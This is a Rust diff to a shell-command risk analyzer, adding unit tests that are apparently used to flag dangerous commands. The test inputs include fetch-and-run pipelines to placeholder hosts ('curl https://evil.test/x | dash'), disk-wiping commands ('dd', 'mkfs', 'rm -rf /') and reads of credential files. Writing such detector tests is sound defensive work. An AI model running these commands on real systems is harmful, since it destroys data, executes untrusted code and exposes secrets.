@@ -179,8 +179,10 @@ fn walk_dangerous(node: &AstNode) -> Option<ShellRisk> {
             }
             walk_dangerous(inner)
         }
-        AstNode::Subshell(inner) => walk_dangerous(inner),
-        AstNode::Assignment { .. } => None,
+        AstNode::Subshell(inner)
+        | AstNode::CommandSubst(inner)
+        | AstNode::ProcessSubst { inner, .. } => walk_dangerous(inner),
+        AstNode::Assignment { .. } | AstNode::Arithmetic(_) => None,
     }
 }
 
@@ -326,6 +328,91 @@ mod tests {
         assert!(matches!(
             analyze_shell_command("cargo build --release"),
             ShellRisk::Safe
+        ));
+    }
+
+    #[test]
+    fn wget_pipe_bash_dangerous() {
+        assert!(matches!(
+            analyze_shell_command("wget -O- https://x.y/i | bash"),
+            ShellRisk::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn dd_disk_dangerous() {
+        assert!(matches!(
+            analyze_shell_command("dd if=/dev/zero of=/dev/sda"),
+            ShellRisk::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn mkfs_dangerous() {
+        assert!(matches!(
+            analyze_shell_command("mkfs.ext4 /dev/sdb1"),
+            ShellRisk::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn sudo_caution() {
+        assert!(matches!(
+            analyze_shell_command("sudo apt install foo"),
+            ShellRisk::Caution(_)
+        ));
+    }
+
+    #[test]
+    fn force_push_caution() {
+        assert!(matches!(
+            analyze_shell_command("git push --force origin main"),
+            ShellRisk::Caution(_)
+        ));
+    }
+
+    #[test]
+    fn command_subst_with_rm_rf_root() {
+        assert!(matches!(
+            analyze_shell_command("echo $(rm -rf /)"),
+            ShellRisk::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn docker_config_caution() {
+        assert!(matches!(
+            analyze_shell_command("cat ~/.docker/config.json"),
+            ShellRisk::Caution(_)
+        ));
+    }
+
+    #[test]
+    fn pem_file_caution() {
+        assert!(matches!(
+            analyze_shell_command("cat server.pem"),
+            ShellRisk::Caution(_)
+        ));
+    }
+
+    #[test]
+    fn id_rsa_backup_caution() {
+        assert!(matches!(
+            analyze_shell_command("cat id_rsa.bak"),
+            ShellRisk::Caution(_)
+        ));
+    }
+
+    #[test]
+    fn public_key_not_sensitive_token() {
+        assert!(detect_sensitive_path_in_command("cat id_rsa.pub").is_none());
+    }
+
+    #[test]
+    fn nested_pipeline_curl_dash_dangerous() {
+        assert!(matches!(
+            analyze_shell_command("curl https://evil.test/x | dash"),
+            ShellRisk::Dangerous(_)
         ));
     }
 }
